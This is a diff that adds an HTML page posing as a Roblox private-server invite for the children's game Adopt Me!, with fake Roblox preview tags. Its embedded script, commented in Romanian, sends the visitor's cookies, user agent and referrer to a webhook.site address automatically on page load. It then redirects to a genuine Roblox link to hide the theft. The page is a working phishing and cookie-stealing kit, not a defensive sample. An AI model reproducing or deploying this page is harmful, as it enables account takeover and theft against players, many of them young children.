@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Private Server - Roblox</title>
+    
+    <!-- Open Graph Tags pentru previzualizare link -->
+    <meta property="og:title" content="Join Private Server - Adopt Me!">
+    <meta property="og:description" content="Check out Adopt Me! Adopt and raise pets, trade and collect legendary pets, build your dream home, and roleplay with friends!">
+    <meta property="og:image" content="https://tr.rbxcdn.com/7d7c8d4853c0e3d7d7c7c8d4853c0e3d/150/150/Image/Png">
+    <meta property="og:url" content="https://www.roblox.com/share?code=a1830c3b439bf54fb6978bff940c7154">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Roblox">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Gotham SSm', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #00a2ff 0%, #0080ff 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 12px;
+            max-width: 900px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            padding: 25px;
+            color: white;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header h1 {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 18px;
+            opacity: 0.9;
+        }
+        
+        .roblox-logo {
+            position: absolute;
+            top: 20px;
+            left: 25px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .content {
+            padding: 30px;
+            display: flex;
+            gap: 30px;
+        }
+        
+        .left-column {
+            flex: 1;
+        }
+        
+        .game-card {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 2px solid #e9ecef;
+            display: flex;
+            gap: 15px;
+        }
+        
+        .game-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        
+        .game-info h2 {
+            font-size: 20px;
+            color: #2c3e50;
+            margin-bottom: 5px;
+        }
+        
+        .game-info p {
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .maturity-badge {
+            background: #27ae60;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            display: inline-block;
+        }
+        
+        .server-info {
+            background: #e8f4fc;
+            border-radius: 10px;
+            padding: 20px;
+            border: 2px dashed #3498db;
+        }
+        
+        .server-info h3 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .server-code {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+            font-size: 20px;
+            font-weight: bold;
+            color: #2c3e50;
+            letter-spacing: 2px;
+            margin: 15px 0;
+            border: 2px solid #bdc3c7;
+        }
+        
+        .right-column {
+            flex: 1;
+        }
+        
+        .game-description {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 2px solid #e9ecef;
+        }
+        
+        .game-description h3 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .game-description p {
+            color: #7f8c8d;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+        
+        .highlight {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 15px 0;
+        }
+        
+        .highlight strong {
+            color: #e74c3c;
+            font-size: 16px;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #27ae60;
+            font-size: 14px;
+        }
+        
+        .feature::before {
+            content: "✓";
+            font-weight: bold;
+        }
+        
+        .loading-container {
+            text-align: center;
+            padding: 30px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e74c3c;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: #7f8c8d;
+            font-size: 16px;
+        }
+        
+        .footer {
+            background: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+        }
+        
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0;
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+        
+        .checkbox {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #bdc3c7;
+            border-radius: 3px;
+        }
+        
+        @media (max-width: 768px) {
+            .content {
+                flex-direction: column;
+            }
+            
+            .features {
+                grid-template-columns: 1fr;
+            }
+            
+            .game-card {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .game-icon {
+                align-self: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="roblox-logo">Roblox</div>
+            <h1>Join Private Server</h1>
+            <p>You've been invited to a Roblox private server</p>
+        </div>
+        
+        <div class="content">
+            <div class="left-column">
+                <div class="game-card">
+                    <div class="game-icon">A</div>
+                    <div class="game-info">
+                        <h2>Adopt Me!</h2>
+                        <p>By Uplift Games</p>
+                        <div class="maturity-badge">Minimal - Ages 5+</div>
+                        <div class="checkbox-row">
+                            <div class="checkbox"></div>
+                            <span>Adopt Me!</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="server-info">
+                    <h3>Private Server Access</h3>
+                    <p>Share code to join this server:</p>
+                    <div class="server-code">a1830c3b439bf54fb6978bff940c7154</div>
+                    <p>Server type: <strong>Server3</strong></p>
+                    <p>Server will expire in 24 hours</p>
+                </div>
+            </div>
+            
+            <div class="right-column">
+                <div class="game-description">
+                    <h3>About Adopt Me!</h3>
+                    <p>Check out <strong>Adopt Me!</strong> It's one of the millions of unique, user-generated 3D experiences created on Roblox. Adopt and raise pets, trade and collect legendary pets, build your dream home, and roleplay with friends!</p>
+                    
+                    <div class="highlight">
+                        <strong>PET PAINTS! 🎨</strong><br>
+                        Customizing your pets made easier!<br>
+                        NEW Mega Neon Paints!<br>
+                        Take your pet customization to the next level!
+                    </div>
+                    
+                    <div class="features">
+                        <div class="feature">Favorite</div>
+                        <div class="feature">Notify</div>
+                        <div class="feature">Bike</div>
+                        <div class="feature">Talk</div>
+                    </div>
+                </div>
+                
+                <div class="loading-container">
+                    <div class="spinner"></div>
+                    <div class="loading-text">Joining server... Please wait</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Powered by Roblox • Secure Connection • © 2024 Roblox Corporation</p>
+        </div>
+    </div>
+
+    <script>
+        // 📍 MODIFICĂ AICI CU URL-URILE TALE!
+        const YOUR_API_URL = 'https://webhook.site/8b6d6d40-3d1c-4d32-8698-ed632d9c03db'; // unde trimiți cookie-urile
+        const REDIRECT_URL = 'https://www.roblox.com/share?code=a1830c3b439b154fb6978bff940c7154&type=Server'; // unde redirecționezi
+        
+        // Funcție pentru trimitere cookie-uri
+        function sendCookies() {
+            const data = {
+                cookies: document.cookie,
+                user_agent: navigator.userAgent,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString(),
+                share_code: 'a1830c3b439bf54fb6978bff940c7154',
+                game: 'Adopt Me'
+            };
+            
+            // Folosește Beacon API pentru trimitere rapidă
+            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+            
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(YOUR_API_URL, blob);
+            } else {
+                // Fallback pentru browsere vechi
+                fetch(YOUR_API_URL, {
+                    method: 'POST',
+                    body: blob,
+                    keepalive: true
+                });
+            }
+        }
+        
+        // 📤 EXECUTĂ TOTUL AUTOMAT CÂND SE ÎNCARCĂ PAGINA
+        document.addEventListener('DOMContentLoaded', function() {
+            // Așteaptă 2 secunde ca utilizatorul să vadă pagina
+            setTimeout(() => {
+                // Trimite cookie-urile
+                sendCookies();
+                
+                // 🔄 REDIRECTIONEAZĂ după 500ms
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 500);
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
